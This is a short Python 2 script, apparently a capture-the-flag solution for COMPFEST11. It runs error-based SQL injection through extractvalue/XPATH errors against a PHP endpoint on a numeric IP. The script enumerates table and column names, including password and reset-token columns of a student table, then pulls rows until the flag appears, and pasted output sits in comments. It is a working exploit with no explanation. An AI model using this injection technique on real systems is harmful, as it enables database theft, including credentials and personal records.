import requests
import re

conn = requests.Session()
for i in range(5):
    exploitable_url = "http://104.250.105.109:19008/includes/deltxhasil.php?urut=ptn%2Cextractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%20{},1)))--&tahapan=1".format(i)
    r = conn.get(url = exploitable_url)
    print r.text

'''
XPATH syntax error: '
data_prodi'
XPATH syntax error: '
data_provinsi'
XPATH syntax error: '
data_ptn'
XPATH syntax error: '
data_siswa'
XPATH syntax error: '
data_um'
'''

for i in range(36):
    exploitable_url = "http://104.250.105.109:19008/includes/deltxhasil.php?urut=ptn%2Cextractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name='data_siswa' limit {},1)))--&tahapan=1".format(i)
    r = conn.get(url = exploitable_url)
    print r.text

"""
XPATH syntax error: '
nis'
XPATH syntax error: '
level'
XPATH syntax error: '
kelas'
XPATH syntax error: '
nama'
XPATH syntax error: '
jk'
XPATH syntax error: '
email'
XPATH syntax error: '
rank5s'
XPATH syntax error: '
rank5sun'
XPATH syntax error: '
password'
XPATH syntax error: '
resettoken'
XPATH syntax error: '
resettime'
"""
i = 0
flag = ""

while True:
    exploitable_url = "http://104.250.105.109:19008/includes/deltxhasil.php?urut=ptn%2Cextractvalue(0x0a,concat(0x0a,(select nama from data_siswa limit {},1)))--&tahapan=1".format(i)
    i += 1
    r = conn.get(url = exploitable_url)
    text = r.text
    if(text.find("COMPFEST") != -1):
        text = re.findall(r"COMPFEST11{(.*)}", text)[0]
        flag += text
        print i 
        break
print "Flag: COMPFEST11{%s}" % flag
